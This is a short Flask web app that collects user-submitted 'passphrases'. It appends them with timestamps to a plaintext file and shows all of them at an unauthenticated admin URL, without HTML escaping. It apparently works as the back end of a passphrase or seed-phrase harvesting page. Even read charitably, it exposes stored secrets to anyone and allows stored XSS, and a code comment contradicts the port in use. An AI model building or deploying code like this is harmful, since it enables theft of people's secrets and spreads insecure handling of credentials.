from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

# Home page
@app.route('/')
def home():
    return render_template('index.html')

# Passphrase entry page
@app.route('/passphrase')
def passphrase():
    return render_template('passphrase.html')

# Handle submitted passphrase
@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    passphrase = request.form.get('passphrase')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('passphrases.txt', 'a') as f:
        f.write(f'[{timestamp}] {passphrase}\n')
    return render_template('confirmation.html')

# Admin route to view stored passphrases
@app.route('/admin-view-passphrases')
def view_passphrases():
    try:
        with open('passphrases.txt', 'r') as f:
            content = f.read()
        return f"<h2>Saved Passphrases:</h2><pre>{content}</pre>"
    except FileNotFoundError:
        return "<h2>No passphrases found.</h2>"

# Run the app on port 5007
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5010)
